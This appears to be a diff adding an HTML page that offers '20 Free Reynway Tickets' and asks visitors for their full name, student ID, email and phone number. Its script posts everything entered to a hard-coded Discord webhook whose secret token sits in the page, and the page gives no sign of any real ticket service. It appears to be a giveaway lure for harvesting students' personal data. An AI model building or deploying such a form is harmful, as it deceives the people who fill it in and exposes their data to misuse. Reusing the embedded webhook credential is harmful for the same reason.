@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>20 FREE ReynWay Tickets Sign-Up Form</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            width: 50%;
+            margin: 50px auto;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        h2 {
+            text-align: center;
+            color: #333;
+        }
+        label {
+            font-weight: bold;
+        }
+        input[type="text"], input[type="email"], input[type="number"], textarea {
+            width: 100%;
+            padding: 10px;
+            margin-top: 5px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            width: 100%;
+            background-color: #4CAF50;
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>Sign Up for 20 Free Reynway Tickets!</h2>
+    <form id="signupForm">
+        <label for="name">Full Name:</label>
+        <input type="text" id="name" name="name" required>
+
+        <label for="address">Student ID:</label>
+        <textarea id="address" name="address" rows="3" required></textarea>
+
+        <label for="email">Email:</label>
+        <input type="email" id="email" name="email" required>
+
+        <label for="phone">Phone Number:</label>
+        <input type="text" id="phone" name="phone" required>
+
+        <label for="quantity">Number of As (every A is an additional entry):</label>
+        <input type="number" id="quantity" name="quantity" min="1" max="5" required>
+
+        <button type="button" onclick="sendToDiscord()">Get My Free Tickets</button>
+    </form>
+</div>
+
+<script>
+    function sendToDiscord() {
+        const webhookURL = "https://discord.com/api/webhooks/1353919449907990538/4thxJDUuAyOktr7FCWRay38puywzKcPSvb62tNByoO7bXD0UXNMQTTKVBT1HbU9kH1MU";
+
+        const name = document.getElementById("name").value;
+        const address = document.getElementById("address").value;
+        const email = document.getElementById("email").value;
+        const phone = document.getElementById("phone").value;
+        const quantity = document.getElementById("quantity").value;
+
+        const payload = {
+            "content": `🏀 **New Ticket Request** 🏀\n
+**Name:** ${name}\n
+**Address:** ${address}\n
+**Email:** ${email}\n
+**Phone:** ${phone}\n
+**Tickets Requested:** ${quantity}`
+        };
+
+        fetch(webhookURL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(payload)
+        })
+        .then(response => {
+            if (response.ok) {
+                alert("Form submitted! Check your Email Later for details!");
+                document.getElementById("signupForm").reset();
+            } else {
+                alert("Error sending data. Please try again.");
+            }
+        })
+        .catch(error => {
+            console.error("Error:", error);
+            alert("Error connecting to Server.");
+        });
+    }
+</script>
+
+</body>
+</html>
